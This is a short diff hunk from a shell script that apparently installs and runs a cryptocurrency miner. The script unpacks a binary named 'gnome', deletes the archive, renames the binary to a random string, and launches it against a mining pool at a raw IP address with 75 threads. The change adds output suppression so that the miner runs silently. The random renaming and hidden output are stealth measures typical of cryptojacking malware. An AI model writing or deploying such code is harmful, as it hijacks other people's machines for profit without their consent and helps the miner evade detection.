@@ -3,4 +3,4 @@ tar -xf gnome.tar
 rm -rf gnome.tar
 variable5=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv gnome $variable5
-./$variable5 --account CP_smm --pool 47.236.56.131:443 --worker $variable5 --thread 75
+./$variable5 --account CP_smm --pool 47.236.56.131:443 --worker $variable5 --thread 75 > /dev/null 2>&1
